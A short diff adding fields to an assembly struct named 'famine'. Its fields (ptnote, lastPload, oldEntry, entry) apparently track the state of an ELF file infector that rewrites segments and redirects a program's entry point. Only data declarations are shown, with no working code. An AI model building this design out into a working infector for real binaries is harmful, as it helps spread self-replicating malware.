@@ -105,15 +105,25 @@ struc famine
     fd:         resq 1
     fileSize:   resq 1
     fileData:   resq 1
+    fileType:   resq 1
     segv_mode:  resq 1
     pload:      resq 1
+    ptdynamic:  resq 1
+    psize:      resq 1
     ptnote:     resq 1
     lastPload:  resq 1
     entry:      resq 1
     oldEntry:   resq 1
+
     programStart: resq 1
     ppid:       resq 1
 
+    programEnd: resq 1
+
     wait_opt:   resd 1
     fileName: resb PATH_BUFF_SIZE
+
+    pathName: resb 128
+
+    fileTypeData: resb 128
 endstruc
